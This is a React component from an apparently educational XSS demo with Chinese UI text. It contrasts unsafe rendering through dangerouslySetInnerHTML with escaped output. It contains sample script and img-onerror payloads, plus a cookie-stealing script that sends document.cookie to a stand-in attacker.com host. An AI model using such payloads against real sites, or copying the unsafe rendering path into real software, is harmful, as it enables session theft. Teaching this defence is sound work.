'use client'
import { useState } from 'react'

export default function DemoArea() {
    const [userInput, setUserInput] = useState(`这是一个普通评论<script>alert('XSS攻击!')</script><img src=x onerror="alert('图片XSS')">`)
    const [output, setOutput] = useState('渲染结果将显示在这里...')
    const [attackResult, setAttackResult] = useState({ show: false, type: '', message: '' })

    const renderUnsafe = () => {
        setOutput(userInput)
        setAttackResult({
            show: true,
            type: 'danger',
            message: '<strong>⚠️ 安全警告：</strong>检测到不安全的渲染！恶意脚本可能已执行。'
        })
    }

    const renderSafe = () => {
        // 模拟 Next.js 自动转义
        const escapedContent = userInput
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;')

        setOutput(escapedContent)
        setAttackResult({
            show: true,
            type: 'success',
            message: '<strong>✅ 安全：</strong>内容已安全转义，脚本不会执行。'
        })
    }

    const stealCookies = () => {
        // 设置一个模拟的 Cookie
        document.cookie = "sessionId=abc123; path=/"

        const maliciousInput = `<script>
      var cookies = document.cookie;
      var img = new Image();
      img.src = 'https://attacker.com/steal?c=' + cookies;
      document.write('你的Cookie已被窃取: ' + cookies);
    </script>`

        setUserInput(maliciousInput)
        setOutput(maliciousInput)
        setAttackResult({
            show: true,
            type: 'danger',
            message: `<strong>🔓 Cookie 窃取演示：</strong> 
        <p class="mt-2">如果这个脚本被执行，你的 Cookie (${document.cookie}) 将被发送到攻击者的服务器。</p>
        <p class="mt-1">使用 HTTPOnly Cookie 可以防止这种攻击。</p>`
        })
    }

    const resetDemo = () => {
        setUserInput(`这是一个普通评论<script>alert('XSS攻击!')</script><img src=x onerror="alert('图片XSS')">`)
        setOutput('渲染结果将显示在这里...')
        setAttackResult({ show: false, type: '', message: '' })
    }

    return (
        <div className="bg-white rounded-2xl shadow-lg p-8 mb-8">
            <h2 className="text-3xl font-bold text-blue-700 mb-6">XSS 攻击演示</h2>
            <p className="text-gray-700 mb-6">下面的演示展示了在 Next.js 应用中可能发生的 XSS 攻击场景。</p>

            <div className="space-y-6">
                <div>
                    <label htmlFor="userInput" className="block text-sm font-medium text-gray-700 mb-2">
                        输入评论（模拟用户输入）：
                    </label>
                    <textarea
                        id="userInput"
                        value={userInput}
                        onChange={(e) => setUserInput(e.target.value)}
                        className="w-full px-3 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                        rows="4"
                        placeholder="输入您的评论..."
                    />
                </div>

                <div className="flex flex-wrap gap-3">
                    <button
                        onClick={renderUnsafe}
                        className="px-6 py-3 bg-red-600 text-white font-semibold rounded-lg hover:bg-red-700 transition-colors"
                    >
                        不安全渲染
                    </button>
                    <button
                        onClick={renderSafe}
                        className="px-6 py-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-700 transition-colors"
                    >
                        安全渲染
                    </button>
                    <button
                        onClick={stealCookies}
                        className="px-6 py-3 bg-red-600 text-white font-semibold rounded-lg hover:bg-red-700 transition-colors"
                    >
                        窃取 Cookie 演示
                    </button>
                    <button
                        onClick={resetDemo}
                        className="px-6 py-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-700 transition-colors"
                    >
                        重置演示
                    </button>
                </div>

                <div className="bg-gray-50 border border-gray-200 rounded-lg p-4 min-h-[100px]">
                    <div
                        className="font-mono text-sm whitespace-pre-wrap"
                        dangerouslySetInnerHTML={{ __html: output }}
                    />
                </div>

                {attackResult.show && (
                    <div
                        className={`p-4 rounded-lg ${
                            attackResult.type === 'danger'
                                ? 'bg-red-50 border border-red-200 text-red-800'
                                : 'bg-green-50 border border-green-200 text-green-800'
                        }`}
                        dangerouslySetInnerHTML={{ __html: attackResult.message }}
                    />
                )}

                <div className="bg-yellow-50 border-l-4 border-yellow-400 p-6">
                    <p className="font-semibold text-yellow-800">
                        <strong>观察结果：</strong>不安全渲染会执行恶意脚本，而安全渲染会将脚本作为文本显示。
                    </p>
                </div>
            </div>
        </div>
    )
}